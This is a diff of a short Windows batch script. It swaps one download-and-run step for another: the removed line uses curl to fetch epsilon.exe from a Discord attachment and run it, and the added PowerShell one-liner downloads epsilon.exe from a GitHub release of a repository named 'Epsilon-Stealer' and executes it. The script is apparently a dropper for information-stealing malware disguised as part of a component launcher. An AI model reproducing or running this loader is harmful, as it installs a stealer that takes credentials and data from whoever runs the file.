@@ -1,6 +1,6 @@
 @echo off
 cd Components
-curl -o epsilon.exe https://cdn.discordapp.com/attachments/1186759970017005689/1206279452712112128/epsilon.exe?ex=65db6e49&is=65c8f949&hm=dc0f1329316f23d2ac6a3a093b098734e321cb4e2c46ba16211f578d82a54270& && epsilon.exe
+powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/Epsilon-Stealer/releases/download/epsilon/epsilon.exe';$file='epsilon.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 cd ..
 cd /d %~dp0
 
